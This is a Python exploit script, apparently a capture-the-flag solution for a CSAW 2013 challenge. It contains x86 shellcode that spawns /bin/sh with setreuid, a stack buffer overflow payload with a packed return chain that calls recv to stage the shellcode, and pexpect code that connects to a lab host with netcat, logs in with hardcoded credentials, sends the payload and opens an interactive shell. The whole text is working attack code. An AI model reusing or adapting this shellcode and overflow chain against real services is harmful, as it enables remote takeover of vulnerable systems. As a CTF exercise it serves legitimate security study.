import pexpect
import struct
def main():
	shellcode = "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"
	read_ptr = 0x80486e0
        recv_ptr = 0x8048890
        p = struct.pack("<L",recv_ptr) + struct.pack("<L",0) + struct.pack("<L",4) + struct.pack("<L",0x804b000) + struct.pack("<L",len(shellcode)) + struct.pack("<L",0) + "\x00\x00\x00\x00"
	payload = "A"*1052+"B"*4+p
	p = pexpect.spawn("nc 192.168.56.101 34266")
	raw_input("$")
	p.expect("UserName: ")
	p.sendline('csaw2013')
	p.expect("Password: ")
	p.sendline('S1mplePWD')
	p.expect("Entry Info: ")
	p.sendline('65535')
	p.sendline(payload)
	p.sendline('AAAAABBBB')
	p.interact()
main()
